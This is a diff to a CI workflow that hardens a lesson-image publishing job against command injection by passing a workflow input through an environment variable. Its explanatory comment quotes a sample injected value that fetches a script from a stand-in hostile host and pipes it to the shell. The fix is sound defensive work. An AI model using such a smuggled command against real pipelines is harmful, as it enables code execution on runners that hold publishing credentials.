@@ -50,6 +50,14 @@ jobs:
 
       # The gate is the point of publishing from CI: seed must FAIL and
       # solution must PASS every direction, for every image, every time.
+      #
+      # IMAGES is passed via env, not interpolated directly into `run:` —
+      # direct interpolation of a workflow_dispatch input into a run script
+      # is a command-injection vector (e.g. `images: "foo; curl evil.sh|sh"`)
+      # on a runner that holds DEVABLE_CONTENT_TOKEN and packages:write.
+      # The env var still word-splits the same way the raw input would.
       - name: Verify and push
         working-directory: devable
-        run: ./scripts/build-lesson-images.sh --push --ci ${{ inputs.images }}
+        env:
+          IMAGES: ${{ inputs.images }}
+        run: ./scripts/build-lesson-images.sh --push --ci $IMAGES
